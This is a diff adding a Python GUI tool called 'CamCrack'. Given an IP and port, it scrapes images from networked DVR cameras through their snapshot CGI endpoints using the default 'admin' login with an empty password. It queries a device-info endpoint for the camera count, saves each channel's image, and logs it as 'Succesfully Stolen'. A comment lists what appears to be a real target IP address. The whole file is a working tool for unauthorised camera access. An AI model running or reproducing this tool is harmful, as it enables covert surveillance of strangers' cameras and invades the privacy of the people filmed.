@@ -1,0 +1,148 @@
+from tkinter import Button, Label, Entry, W, SW, Menu, PhotoImage
+import tkinter as tk
+from tkinter import ttk
+from bs4 import BeautifulSoup
+import webbrowser
+import requests
+from selenium import webdriver
+from io import BytesIO
+from PIL import Image
+import time
+
+timeStamp = time.time()
+var_defeway_ss_url = "cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=0"
+print('Launching GUI... ', time.time() - timeStamp)
+
+
+class Main:
+    """Main()for any feature before
+    the GUI launches"""
+
+    class Gui:
+        def __init__(self):
+
+            # Declare GUI window
+            self.window = tk.Tk()
+            self.window.title('CamCrack v1.github')
+
+            # CHANGE THIS TO VARIABLE
+            # AND ADD ENTRY WIDGET ON CONFIGURATION TAB
+            # TO SET PATH VARIABLE
+            self.geckodriver = 'C:\\Users\\jzbkn\\Gecko\\geckodriver.exe'
+
+            self.options = webdriver.FirefoxOptions()
+            self.options.add_argument('-headless')
+            self.browser = webdriver.Firefox(executable_path=self.geckodriver, options=self.options)
+
+            # Creating self.menubar
+            self.menubar = Menu(self.window)
+            # Adding self.file Menu and commands
+            self.file = Menu(self.menubar, tearoff=0)
+            self.menubar.add_cascade(label='File', menu=self.file)
+            self.file.add_command(label='New File', command=None)
+            self.file.add_command(label='Open...', command=None)
+            self.file.add_command(label='Save', command=None)
+            self.file.add_separator()
+            self.file.add_command(label='Exit', command=self.window.destroy)
+            # Adding Edit Menu and commands
+            edit = Menu(self.menubar, tearoff=0)
+            self.menubar.add_cascade(label='Edit', menu=edit)
+            edit.add_command(label='Cut', command=None)
+            edit.add_command(label='Copy', command=None)
+            edit.add_command(label='Paste', command=None)
+            edit.add_command(label='Select All', command=None)
+            edit.add_separator()
+            edit.add_command(label='Find...', command=None)
+            edit.add_command(label='Find again', command=None)
+            # Adding self.help Menu
+            self.help_ = Menu(self.menubar, tearoff=0)
+            self.menubar.add_cascade(label='Help', menu=self.help_)
+            self.help_.add_command(label='Camera Help', command=None)
+            self.help_.add_command(label='Demo', command=None)
+            self.help_.add_separator()
+            self.help_.add_command(label='About CamCrack', command=None)
+            # Adding Text Entry and Button Widget
+            self.label_1 = Label(self.window, text="IP Address:").grid(row=0, column=0, sticky=W)
+            self.var_ip = Entry(self.window, width=15, )
+            self.var_ip.grid(row=0, column=1, sticky=SW)
+            self.label_2 = Label(self.window, text="Port number:").grid(row=0, column=2, sticky=W)
+            self.var_port = Entry(self.window, width=9, )
+            self.var_port.grid(row=0, column=3, sticky=W)
+            self.button = Button(self.window, text="run", width=3, command=self.http_status)
+            self.button.grid(row=0, column=4, sticky=W)
+            # Maintaining Window and Menu
+            self.window.config(menu=self.menubar)
+            self.window.mainloop()
+
+            # Iterate througha text file for screenshot variable (self.eachline)
+
+        def http_status(self):
+            i = 0
+            self.ssurl = open('C:\\Users\\jzbkn\ssurl.txt', 'r')
+            self.pr = 'http://'
+            for self.eachline in self.ssurl:
+                self.need_ss_url = self.pr + self.var_ip.get() + ':' + self.var_port.get() + '/'
+                self.test = self.pr + self.var_ip.get() + ':' + self.var_port.get() + '/' + self.eachline
+                response = requests.get(self.test)
+                print('Http Request Sent:', time.time() - timeStamp)
+                if response.status_code == 200:
+                    print('Success!', time.time() - timeStamp)
+                    self.find_cam_count()
+                    print('find_cam_count', time.time() - timeStamp)
+                    for i in range(0, self.cam_count_inc):
+                        self.browser.get(self.need_ss_url + \
+                        'cgi-bin/snapshot.cgi?chn=' + str(i) + '&u=admin&p=&q=0')  # CHANGE THIS TO SCREENSHOT FUNCTION
+                        print('browser.get' + str(i), time.time() - timeStamp)
+                        self.nb = ttk.Notebook(self.window)
+                        self.nb.grid(row=1, column=0, sticky='NSEW')
+                        self.element = self.browser.find_element_by_tag_name('img')
+                        self.location = self.element.location
+                        self.size = self.element.size
+                        self.png = self.browser.get_screenshot_as_png()
+                        print('browser.get_screenshot_as_png()' + str(i), time.time() - timeStamp)
+                        self.im = Image.open(BytesIO(self.png))
+                        print('Image.open(BytesIO(self.png))()' + str(i), time.time() - timeStamp)
+                        print('Screenshot ' + str(i) + ': Succesfully Stolen', time.time() - timeStamp)
+                        self.left = self.location['x']
+                        self.top = self.location['y']
+                        self.right = self.location['x'] + self.size['width']
+                        self.bottom = self.location['y'] + self.size['height']
+                        self.im = self.im.crop((self.left, self.top, self.right, self.bottom))
+                        print('im.crop' + str(i), time.time() - timeStamp)
+                        self.im.save('C:\\Users\\jzbkn\\Gecko\\newshot' + str(i) + '.png')
+                        print('im.save' + str(i), time.time() - timeStamp)
+                        print('Camera ' + str(i) + ': Completed and Preparing for Display', time.time() - timeStamp)
+                        print("")
+                        self.tab = ttk.Frame(self.nb)
+                        self.nb.add(self.tab, text="Camera " + str(i))
+                        print('nb.add' + str(i), time.time() - timeStamp)
+                        self.snap = PhotoImage(file='C:\\Users\\jzbkn\\Gecko\\newshot' + str(i) + '.png')
+                        self.snap.image = self.snap
+                        self.label_3 = Label(self.tab, image=self.snap).grid(row=0, column=0, sticky=W)
+
+
+                else:
+                    response.status_code != 200
+                    break
+                    #print('Failed')
+
+            self.ssurl.close()
+
+            # 201.9.254.38
+
+        def find_cam_count(self):
+            self.xml_url = 'cgi-bin/gw.cgi?xml=<juan+><devinfo+camcnt=""/></juan>'
+            self.xml_status = self.need_ss_url + self.xml_url
+            self.session = requests.Session()
+            self.response = self.session.get(self.xml_status)
+            self.session.close()
+            self.soup = BeautifulSoup(self.response.content, 'xml')
+            self.tag = self.soup.find('devinfo')
+            self.cam_count = int(self.tag.get('camcnt'))
+            self.cam_count_inc = self.cam_count + 1
+            print('Camera Count is : ' + str(self.cam_count))
+
+    gui = Gui()
+
+
+main = Main()
